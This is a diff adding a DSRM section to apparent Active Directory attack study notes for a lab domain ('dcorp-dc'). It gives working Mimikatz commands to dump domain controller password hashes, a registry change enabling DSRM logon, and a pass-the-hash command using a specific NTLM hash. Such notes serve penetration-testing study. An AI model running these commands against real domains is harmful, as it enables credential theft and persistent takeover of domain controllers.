@@ -73,6 +73,50 @@ BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.mo
 ![[Pasted image 20231215170247.png]]
 
 ---
+### DSRM
+- DSRM is Directory Services Restore Mode.
+- There is a local administrator on every DC called "Administrator" whose password is the DSRM password.
+- DSRM password (SafeModePassword) is required when a server is promoted to Domain Controller and it is rarely changed.
+- After altering the configuration on the DC, it is possible to pass the NTLM hash of this user to access the DC.
+
+#### Attack
+- Dump DSRM password (needs DA privileges)
+```powershell
+Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' 
+-Computername dcorp-dc
+```
+- Compare the Administrator hash with the Administrator hash of below command
+- First one is the DSRM local Administrator.
+```powershell
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc
+```
+- Since it is the local administrator of the DC, we can _pass the hash_ to authenticate.
+- But, the Logon Behavior for the DSRM account needs to be changed before we can use its hash:
+```powershell
+Enter-PSSession -Computername dcorp-dc
+New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name
+"DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
+```
+- Pass the hash
+```powershell
+Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-
+dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"'
+```
+```powershell
+ls \\dcorp-dc\C$
+```
+
+
+
+
+
+
+
+
+
+
+
+---
 ### Skeleton Key
 - Skeleton key is a persistence technique where it is possible to patch a Domain Controller (lsass process) so that it allows access as any user with a single password.
 - The attack was discovered by Dell Secureworks used in a malware named the Skeleton Key malware.
